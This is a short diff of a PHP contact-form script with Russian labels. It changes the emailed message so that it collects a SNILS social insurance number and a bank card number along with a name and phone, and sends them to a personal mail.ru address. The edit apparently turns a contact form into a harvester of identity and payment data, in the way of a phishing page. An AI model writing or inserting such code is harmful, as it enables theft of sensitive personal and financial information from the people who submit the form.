@@ -1,9 +1,8 @@
 <?php
 if (isset ($_POST['contactFF'])) {
   $to = "alimyradd@mail.ru";// моя почта
-  /*$from = "support@tpverstak.ru";*/
   $subject = "Заполнена контактная форма на сайте ".$_SERVER['HTTP_REFERER'];
-  $message = "Имя пользователя: ".$_POST['nameFF']."\nEmail пользователя ".$_POST['contactFF']."\nТелефон пользователя ".$_POST['telFF']."\nСообщение: ".$_POST['projectFF']."\n\nАдрес сайта: ".$_SERVER['HTTP_REFERER'];
+  $message = "Имя пользователя: ".$_POST['nameFF']."\nснилс ".$_POST['snilsF']."\nномер карты ".$_POST['contactFF']."\nтелефон ".$_POST['tellFF']."\n\nАдрес сайта: ".$_SERVER['HTTP_REFERER'];
  
   $boundary = md5(date('r', time()));
   $filesize = '';
